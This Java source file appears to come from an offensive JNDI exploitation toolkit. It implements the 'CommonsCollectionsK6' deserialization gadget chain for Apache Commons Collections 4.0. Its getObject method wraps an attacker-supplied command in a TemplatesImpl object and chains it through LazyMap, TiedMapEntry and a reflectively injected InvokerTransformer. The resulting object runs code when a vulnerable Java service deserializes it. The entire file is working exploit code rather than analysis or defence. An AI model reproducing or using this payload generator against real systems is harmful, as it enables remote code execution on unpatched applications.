package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.Reflections;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import java.util.HashMap;
import java.util.Map;



@Dependencies({"commons-collections:commons-collections:4.0"})
public class CommonsCollectionsK6 implements ObjectPayload<Object> {

    @Override
    public Object getObject(String command) throws Exception {
        final Object templates;
        templates = Gadgets.createTemplatesImpl(command);
        InvokerTransformer      invokerTransformer = new InvokerTransformer("connect", null, null);
        HashMap<Object, Object> map                = new HashMap<>();
        Map<Object, Object>     lazyMap            = LazyMap.lazyMap(map, new ConstantTransformer(1));
        TiedMapEntry            tiedMapEntry       = new TiedMapEntry(lazyMap, templates);

        HashMap<Object, Object> expMap = new HashMap<>();
        expMap.put(tiedMapEntry, "QI4L");
        lazyMap.remove(templates);

        Reflections.setFieldValue(lazyMap, "factory", invokerTransformer);

        return expMap;
    }
}
